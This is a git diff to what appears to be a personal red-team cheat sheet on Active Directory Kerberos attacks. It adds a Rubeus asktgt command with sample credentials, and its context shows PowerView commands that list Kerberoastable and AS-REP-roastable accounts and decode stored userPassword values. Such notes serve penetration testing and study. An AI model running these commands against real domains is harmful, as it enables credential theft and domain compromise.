@@ -9,11 +9,13 @@ permalink: /:categories/:title/
 ---
 
 <!-- vscode-markdown-toc -->
+* [PREREQ: WHICH OS ? WHAT CREDS ?](#PREREQ:WHICHOSWHATCREDS)
 * [ENUM: KRB DOMAIN POLICIES](#ENUM:KRBDOMAINPOLICIES)
 * [ENUM: TARGETS](#ENUM:TARGETS)
 	* [Kerberoasting](#Kerberoasting)
 	* [AS-REPoasting](#AS-REPoasting)
 	* [User Accounts Status](#UserAccountsStatus)
+* [KERBEROS ASKTGT](#KERBEROSASKTGT)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -21,9 +23,16 @@ permalink: /:categories/:title/
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-## <a name='ENUM:KRBDOMAINPOLICIES'></a>PREREQ: WHICH OS ? WHAT CREDS ?
+## <a name='PREREQ:WHICHOSWHATCREDS'></a>PRE-REQUISITES
+
+### WHICH OS ? WHAT CREDS ?
 
 ![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
+
+### Rubeus Compilation 
+```powershell
+
+```
 
 ## <a name='ENUM:KRBDOMAINPOLICIES'></a>ENUM: KRB DOMAIN POLICIES
 ```powershell
@@ -63,6 +72,7 @@ Get-DomainUser -PreauthNotRequired
 Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 
+
 ### <a name='UserAccountsStatus'></a>User Accounts Status
 ```powershell
 # get all users with passwords changed > 1 year ago, returning sam account names and password last set times
@@ -89,4 +99,10 @@ Invoke-RevertToSelf
 
 # check if any user passwords are set
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
+```
+
+## <a name='KERBEROSASKTGT'></a>KERBEROS ASKTGT 
+```powershell
+# Path on VM Mandiant Commando
+PS C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug > ./Rubeus.exe asktgt /user:admin /password:Password01 /domain:contoso /dc:DC01.contoso.corp
 ```
